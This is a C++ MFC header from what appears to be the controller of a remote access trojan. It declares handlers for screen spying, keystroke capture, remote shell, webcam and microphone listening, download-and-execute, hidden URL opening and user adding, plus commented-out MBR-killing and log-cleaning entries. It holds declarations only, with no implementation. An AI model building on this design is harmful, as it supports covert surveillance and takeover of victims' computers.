#if !defined(AFX_PCVIEW_H__EC15019F_CD92_4263_B499_44AE73A2D446__INCLUDED_)
#define AFX_PCVIEW_H__EC15019F_CD92_4263_B499_44AE73A2D446__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// PcView.h : header file
//
#include "SEU_QQwry.h"	// Added by ClassView
/////////////////////////////////////////////////////////////////////////////
// CPcView view

class CPcView : public CListView
{
protected:
	CPcView();           // protected constructor used by dynamic creation
	DECLARE_DYNCREATE(CPcView)

// Attributes
public:
	void NewInitialUpdate();
	void SendSelectCommand(PBYTE pData, UINT nSize);
	void SendALLSelectCommand(PBYTE pData, UINT nSize);
// Operations
public:
	CListCtrl *m_pListCtrl;
	CImageList   I_ImageList;
	CIOCPServer* m_iocpServer;
//	CEdit	m_net_name;
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CPcView)
	public:
	virtual void OnInitialUpdate();
	protected:
	virtual void OnDraw(CDC* pDC);      // overridden to draw this view
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	//}}AFX_VIRTUAL

// Implementation
protected:
	int             m_nSortedCol;
	bool            m_bAscending;
	CXTHeaderCtrl   m_header;
	void SortColumn(int iCol, bool bAsc);
	virtual ~CPcView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

	// Generated message map functions
protected:
	//{{AFX_MSG(CPcView)
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnRButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnDisconnect();
	afx_msg void OnFilemanager();
	afx_msg void OnScreenspy();
	afx_msg void OnKeyboard();
	afx_msg void OnRemoteshell();
	afx_msg void OnSystem();
	afx_msg void OnWebcam();
	afx_msg void OnAudioListen();
	afx_msg void OnRenameRemark();
	afx_msg void OnRemove();
	afx_msg void OnLogoff();
	afx_msg void OnReboot();
	afx_msg void OnShutdown();
	afx_msg void OnDownexec();
	afx_msg void OnUpdateServer();
	afx_msg void OnOpenUrlHide();
	afx_msg void OnOpenUrlShow();
	afx_msg void OnSelectAll();
	afx_msg void OnUnselectAll();
	afx_msg void OnChangeGroup();
	afx_msg void OnIplist();
	afx_msg void OnIp();
	afx_msg void OnBeizhu();
	afx_msg void OnDilixinxi();
	afx_msg void OnAll();
	afx_msg void OnSermanager();
	afx_msg void OnRegedit();
	afx_msg void OnStartHide();
	afx_msg void OnStartNormal();
	afx_msg void OnUpdata();
	afx_msg void OnNoStart();
//	afx_msg void OnADD_server();  //·þÎñÆ÷
	afx_msg void OnAddUser();
	afx_msg void OnAqglRz();
	afx_msg void OnAqglYp();
	afx_msg void OnShowmsg();
	afx_msg void Suanxinglianjxianshi(UINT str);
//	afx_msg BOOL DeleteIcon();
/*
	afx_msg void OnShowMsg();
	afx_msg void OnOpenPort();
	afx_msg void OnProxy();
	afx_msg void OnPortMapset();
	afx_msg void OnPortMapping();
	afx_msg void OnAddUser();
	afx_msg void OnKillmbr();
	afx_msg void OnCleanAll();
*/
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	SEU_QQwry *m_QQwry;
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSerManagerDialog(WPARAM, LPARAM);
//	afx_msg LRESULT OnFindALL(WPARAM, LPARAM);
//	afx_msg LRESULT OnFind(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenUserDialog(WPARAM, LPARAM);

};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_PCVIEW_H__EC15019F_CD92_4263_B499_44AE73A2D446__INCLUDED_)
